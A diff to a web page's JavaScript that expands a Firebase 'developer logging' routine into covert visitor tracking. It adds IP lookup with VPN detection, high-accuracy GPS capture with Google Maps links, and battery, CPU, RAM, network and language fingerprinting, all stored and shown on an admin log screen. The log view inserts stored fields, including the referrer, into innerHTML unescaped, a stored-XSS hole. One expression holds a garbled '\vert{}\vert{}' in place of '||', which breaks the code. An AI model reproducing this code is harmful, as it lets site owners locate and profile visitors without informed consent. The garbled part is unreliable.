@@ -434,7 +434,7 @@ button{font:inherit;color:inherit;border:none;outline:none;background:none;}
 
 .log-body{display:flex;flex-direction:column;gap:6px;font-size:12px;}
 .log-row{display:flex;gap:8px;align-items:baseline;}
-.log-label{min-width:105px;color:var(--muted);font-weight:600;flex-shrink:0;}
+.log-label{min-width:115px;color:var(--muted);font-weight:600;flex-shrink:0;}
 .log-val{color:var(--text);word-break:break-word;line-height:1.4;}
 .log-val.code-text{font-family:monospace;color:var(--accent2);font-weight:700;background:rgba(0,0,0,0.3);padding:2px 6px;border-radius:4px;}
 .log-val.muted-text{color:var(--muted);font-size:11px;}
@@ -459,7 +459,7 @@ button{font:inherit;color:inherit;border:none;outline:none;background:none;}
     gap:8px;
     padding-bottom:50px;
   }
-  .log-label{min-width:85px;}
+  .log-label{min-width:95px;}
 }
 </style>
 </head>
@@ -661,7 +661,7 @@ function checkAuthAndStart(){
 }
 
 /* ============================================================
-   SISTEM LOGGING PENGEMBANG (FIREBASE REALTIME DATABASE)
+   SISTEM LOGGING PENGEMBANG (FIREBASE REALTIME DATABASE ENHANCED)
    ============================================================ */
 function getOS(){
   const ua = navigator.userAgent;
@@ -690,27 +690,97 @@ function getDeviceType(){
   return "Desktop / Laptop";
 }
 
+async function getBatteryStatus(){
+  if("getBattery" in navigator){
+    try{
+      const b = await navigator.getBattery();
+      const pct = Math.round(b.level * 100);
+      const charging = b.charging ? " ⚡ (Dicas)" : " 🔋 (Baterai)";
+      return `${pct}%${charging}`;
+    }catch(e){}
+  }
+  return "Tidak Didukung";
+}
+
+function getNetworkDetails(){
+  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+  if(!conn) return "Tidak Didukung";
+  const type = conn.effectiveType ? conn.effectiveType.toUpperCase() : "Online";
+  const downlink = conn.downlink ? ` (~${conn.downlink} Mbps)` : "";
+  const saveData = conn.saveData ? " • Hemat Data ON" : "";
+  return `${type}${downlink}${saveData}`;
+}
+
+async function getGPSPosition(){
+  return new Promise((resolve) => {
+    if(!navigator.geolocation) return resolve(null);
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        const lat = pos.coords.latitude.toFixed(6);
+        const lon = pos.coords.longitude.toFixed(6);
+        const acc = Math.round(pos.coords.accuracy);
+        resolve({
+          lat, lon,
+          accuracy: `${acc} meter`,
+          mapsUrl: `https://www.google.com/maps?q=${lat},${lon}`,
+          isGPS: true
+        });
+      },
+      (err) => resolve(null),
+      { enableHighAccuracy: true, timeout: 3000, maximumAge: 60000 }
+    );
+  });
+}
+
 async function logAccessToFirebase(){
   try{
     let geoData = {};
     try{
-      const res = await fetch("https://ipapi.co/json/", { cache: "no-store" });
-      if(res.ok) geoData = await res.json();
+      const res = await fetch("https://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query,proxy,hosting,mobile", { cache: "no-store" });
+      if(res.ok){
+        const d = await res.json();
+        geoData = {
+          ip: d.query || "-",
+          city: d.city || "-",
+          region: d.regionName || "-",
+          country: d.country || "-",
+          isp: d.isp || d.org || "-",
+          asn: d.as || "-",
+          lat: d.lat,
+          lon: d.lon,
+          isVpn: d.proxy || d.hosting || false,
+          isMobile: d.mobile || false
+        };
+      }
     }catch(e){
       try{
-        const res2 = await fetch("https://ip-api.com/json/", { cache: "no-store" });
+        const res2 = await fetch("https://ipapi.co/json/", { cache: "no-store" });
         if(res2.ok){
           const d2 = await res2.json();
           geoData = {
-            ip: d2.query,
-            city: d2.city,
-            region: d2.regionName,
-            country_name: d2.country,
-            org: d2.isp
+            ip: d2.ip || "-",
+            city: d2.city || "-",
+            region: d2.region || "-",
+            country: d2.country_name || "-",
+            isp: d2.org || "-",
+            asn: d2.asn || "-",
+            lat: d2.latitude,
+            lon: d2.longitude,
+            isVpn: false,
+            isMobile: false
           };
         }
       }catch(e2){}
     }
+
+    const battery = await getBatteryStatus();
+    const network = getNetworkDetails();
+    const gpsData = await getGPSPosition();
+
+    const deviceLang = navigator.language || navigator.userLanguage || "-";
+    const deviceTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "-";
+    const cpuCores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Core` : "-";
+    const deviceRAM = navigator.deviceMemory ? `~${navigator.deviceMemory} GB` : "-";
 
     const now = new Date();
     const timeFormatted = now.toLocaleString("id-ID", {
@@ -724,12 +794,31 @@ async function logAccessToFirebase(){
       ip: geoData.ip || "IP Tidak Terdeteksi",
       city: geoData.city || "-",
       region: geoData.region || "-",
-      country: geoData.country_name || geoData.country || "-",
-      isp: geoData.org || geoData.isp || "-",
+      country: geoData.country || "-",
+      isp: geoData.isp || "-",
+      asn: geoData.asn || "-",
+      vpnStatus: geoData.isVpn ? "⚠️ Terdeteksi VPN / Proxy / Datacenter" : "✅ Normal (Non-VPN)",
+      isMobileNetwork: geoData.isMobile ? "Ya (Seluler)" : "Tidak (WiFi/Kabel)",
+      
+      // GPS & Location
+      gpsLat: gpsData ? gpsData.lat : (geoData.lat || "-"),
+      gpsLon: gpsData ? gpsData.lon : (geoData.lon || "-"),
+      gpsAccuracy: gpsData ? gpsData.accuracy : "Perkiraan IP (~5-20km)",
+      gpsMapsUrl: gpsData ? gpsData.mapsUrl : (geoData.lat && geoData.lon ? `https://www.google.com/maps?q=${geoData.lat},${geoData.lon}` : ""),
+      isGPSPrecision: gpsData ? true : false,
+
+      // Specs & Device
       device: getDeviceType(),
       os: getOS(),
       browser: getBrowser(),
-      screen: `${window.screen.width}x${window.screen.height}`,
+      screen: `${window.screen.width}x${window.screen.height} (Scale: ${window.devicePixelRatio || 1}x)`,
+      language: deviceLang,
+      timezone: deviceTimezone,
+      cpu: cpuCores,
+      ram: deviceRAM,
+      battery: battery,
+      network: network,
+
       referrer: document.referrer || "Langsung / Bookmark",
       url: window.location.href,
       userAgent: navigator.userAgent
@@ -823,26 +912,45 @@ async function fetchAndRenderLogs(){
       const card = document.createElement("div");
       card.className = "log-card";
 
+      const isGps = log.isGPSPrecision || false;
+      const mapsLink = log.gpsMapsUrl ? `<a href="${log.gpsMapsUrl}" target="_blank" rel="noopener" style="color:var(--accent2); font-weight:700; text-decoration:underline;">🗺️ Buka Peta Google Maps</a>` : '-';
+
       card.innerHTML = `
         <div class="log-header">
-          <span class="log-badge">#${logsArray.length - idx}</span>
+          <span class="log-badge">#${logsArray.length - idx} ${isGps ? '🎯 GPS Presisi' : ''}</span>
           <span class="log-time">🕒 ${log.timestamp || log.isoTime || '-'}</span>
         </div>
         <div class="log-body">
           <div class="log-row">
-            <span class="log-label">📍 Lokasi:</span>
+            <span class="log-label">📍 Lokasi (IP):</span>
             <span class="log-val"><strong>${log.city || '-'}, ${log.region || '-'}, ${log.country || '-'}</strong> (${log.isp || '-'})</span>
           </div>
           <div class="log-row">
-            <span class="log-label">🌐 IP Address:</span>
+            <span class="log-label">🎯 Lokasi Peta:</span>
+            <span class="log-val">${isGps ? `<strong style="color:var(--accent);">GPS Presisi (${log.gpsAccuracy \vert{}\vert{} '-'})</strong>:${log.gpsLat}, ${log.gpsLon} •${mapsLink}` : `${log.gpsLat && log.gpsLat !== '-' ? `${log.gpsLat}, ${log.gpsLon} • ` : ''}${mapsLink}`}</span>
+          </div>
+          <div class="log-row">
+            <span class="log-label">🌐 Alamat IP:</span>
             <span class="log-val code-text">${log.ip || '-'}</span>
           </div>
           <div class="log-row">
-            <span class="log-label">📱 Perangkat:</span>
+            <span class="log-label">🛡️ Keamanan IP:</span>
+            <span class="log-val">${log.vpnStatus || '✅ Normal (Non-VPN)'} • ASN: ${log.asn || '-'} • Jaringan: ${log.isMobileNetwork || '-'}</span>
+          </div>
+          <div class="log-row">
+            <span class="log-label">📱 HP & OS:</span>
             <span class="log-val">${log.device || '-'} • ${log.os || '-'} • ${log.browser || '-'} (${log.screen || '-'})</span>
           </div>
           <div class="log-row">
-            <span class="log-label">🔗 Sumber URL:</span>
+            <span class="log-label">⚡ Hardware HP:</span>
+            <span class="log-val">CPU: ${log.cpu || '-'} | RAM: ${log.ram || '-'} | Baterai: ${log.battery || '-'}</span>
+          </div>
+          <div class="log-row">
+            <span class="log-label">📶 Koneksi & Time:</span>
+            <span class="log-val">Jaringan: ${log.network || '-'} | Zona Waktu: ${log.timezone || '-'} | Bahasa: ${log.language || '-'}</span>
+          </div>
+          <div class="log-row">
+            <span class="log-label">🔗 Sumber Akses:</span>
             <span class="log-val muted-text">${log.referrer || '-'}</span>
           </div>
         </div>
